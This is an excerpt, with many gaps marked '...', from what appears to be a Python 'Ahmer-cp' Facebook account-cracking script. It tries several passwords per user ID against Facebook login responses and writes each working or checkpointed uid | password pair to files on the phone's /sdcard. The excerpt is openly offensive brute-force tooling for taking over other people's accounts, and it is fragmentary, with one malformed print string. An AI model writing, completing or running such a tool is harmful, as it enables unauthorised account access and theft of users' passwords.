...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print("\t    \033[1;31mLogged in id has Ahmer-cp\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("[Ahmer-cp] "+uid+" | "+pass1)
					cp = open("Ahmer-cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;37m[Ahmer-cp] \033[1;37m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;37m[Ahmer-cp] \033[1;37m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;37m[Ahmer-cp] \033[1;37m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/cP.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("[Ahmer-cp] "+uid+" | "+pass4)
											cp = open("Ahmer-cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;37m[Ahmer-Cp\033[1;37m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;37m[Ahmer-cp] \033[1;37m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;37m[Ahmer-cp] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
...
def ex_id():
    ...
    print(" File downloaded Ahmer-ok")
    time.sleep(1)
    menu()
def choice():
	global token
...
def choice_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;37m[Ahmer-cp] \033[1;37m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/Ahmer-cp.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;37m[] \033[1;37m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/checkpoint.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
